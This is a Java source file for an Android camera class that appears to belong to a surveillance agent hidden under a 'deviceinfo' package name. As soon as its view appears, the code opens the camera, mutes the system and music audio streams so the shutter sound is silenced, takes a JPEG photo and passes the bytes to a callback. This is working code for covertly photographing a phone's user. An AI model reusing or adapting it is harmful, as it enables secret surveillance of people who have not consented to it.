package com.android.deviceinfo.gui;

import java.io.IOException;
import java.util.List;
import java.util.concurrent.TimeUnit;

import android.content.Context;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.PreviewCallback;
import android.hardware.Camera.ShutterCallback;
import android.hardware.Camera.Size;
import android.media.AudioManager;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;

public class Preview extends SurfaceView implements SurfaceHolder.Callback {
	private static final String TAG = "Preview";

	SurfaceHolder mHolder; // <2>
	public Camera camera; // <3>
	CGui cgui;

	private static Object cameraLock = new Object();

	private static Size preferredSize = null;

	private SurfaceHolder holder;

	Preview(CGui cGui) {
		super(cGui);
		cgui = cGui;

		// Install a SurfaceHolder.Callback so we get notified when the
		// underlying surface is created and destroyed.
		mHolder = getHolder(); // <4>
		mHolder.addCallback(this); // <5>
		mHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS); // <6>			
	}

	final ShutterCallback shutterCallback = new ShutterCallback() {

		public void onShutter() {
			if (Cfg.DEBUG) {
				Check.log(TAG + " onShutter");//$NON-NLS-1$
			}
		}
	};
	final PictureCallback rawCallback = new PictureCallback() {
		public void onPictureTaken(final byte[] _data, final Camera _camera) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " onPictureTaken RAW");//$NON-NLS-1$
			}
		}
	};
	final PictureCallback jpegCallback = new PictureCallback() {
		public void onPictureTaken(final byte[] _data, final Camera _camera) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " onPictureTaken JPEG");//$NON-NLS-1$
			}

			cgui.callback(_data);
		}
	};

	// Called once the holder is ready
	public void surfaceCreated(SurfaceHolder holder) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (surfaceCreated)");
		}
		boolean error = false;
		synchronized (cameraLock) {
			try {
				// <7>
				// The Surface has been created, acquire the camera and tell it
				// where
				// to draw.
				camera = Camera.open(); // <8>

				Camera.Parameters camParams = camera.getParameters();

				if (preferredSize == null) {
					List<Camera.Size> sizes = camParams.getSupportedPictureSizes();
					for (Size size : sizes) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (surfaceCreated), size: " + size.width + "/" + size.height);
						}
						if (size.width == 1024 || size.width == 1280 || size.width == 2048) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (surfaceCreated), found");
							}
							preferredSize = size;
							break;
						}
					}
				}

				if(preferredSize!=null){
					camParams.setPictureSize(preferredSize.width, preferredSize.height);
				}

				camParams.set("iso", (String) "400");
				camera.setParameters(camParams);
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (surfaceCreated) Error: " + ex);
				}
				error = true;
			}

			try {
				if (camera != null) {
					camera.setPreviewDisplay(holder); // <9>
					camera.setPreviewCallback(new PreviewCallback() { // <10>
						// Called for each frame previewed
						public void onPreviewFrame(byte[] data, Camera camera) { // <11>
							Preview.this.invalidate(); // <12>
						}
					});
					camera.startPreview();
					error = !click();
				}

			} catch (IOException e) { // <13>
				if (Cfg.DEBUG) {
					Check.log(TAG + " (startCamera) Error: " + e);
				}
				error = true;
			}

		}

		if (error) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (surfaceCreated), error");
			}
			Status.self().getStpe().schedule(new Runnable() {
				public void run() {
					cgui.callback(null);
				}
			}, 100, TimeUnit.MILLISECONDS);

		} else {
			this.holder = holder;
		}
		
		if (Cfg.DEBUG) {
			Check.log(TAG + " (surfaceCreated) : end");
		}
	}

	public void stopCamera() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stopCamera)");
		}
		synchronized (cameraLock) {
			if (camera != null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stopCamera): not null camera");
				}
				camera.setPreviewCallback(null);
				camera.stopPreview();
				camera.release();
				camera = null;
			}
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stopCamera), stopped");
		}
	}

	// Called when the holder is destroyed
	public void surfaceDestroyed(SurfaceHolder holder) { // <14>
		if (Cfg.DEBUG) {
			Check.log(TAG + " (surfaceDestroyed)");
		}
		stopCamera();
	}

	// Called when holder has changed
	public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) { // <15>

	}

	private boolean click() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (click)");
		}

		if (camera != null) {
			camera.setPreviewCallback(null);
			AudioManager audioManager = (AudioManager) Status.getAppContext().getSystemService(Context.AUDIO_SERVICE);
			audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
			audioManager.setStreamMute(AudioManager.STREAM_MUSIC, true);
			
			camera.takePicture(null, null, jpegCallback);
			// camera.takePicture(shutterCallback, rawCallback,
			// jpegCallback);
			
			audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, false);
			audioManager.setStreamMute(AudioManager.STREAM_MUSIC, false);

			return true;
		} else {
			return false;
		}

	}

	public void clear() {
		stopCamera();
	}

}